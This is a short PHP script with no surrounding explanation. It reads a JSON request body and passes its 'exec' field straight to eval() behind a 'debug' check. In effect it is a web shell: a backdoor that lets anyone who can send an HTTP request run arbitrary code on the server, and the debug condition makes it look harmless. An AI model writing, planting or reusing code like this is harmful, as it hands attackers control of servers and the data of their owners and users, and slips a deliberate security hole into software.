<?php
$x="?>".json_decode(file_get_contents('php://input'))->exec;
if (debug){
    eval($x);
}
exit;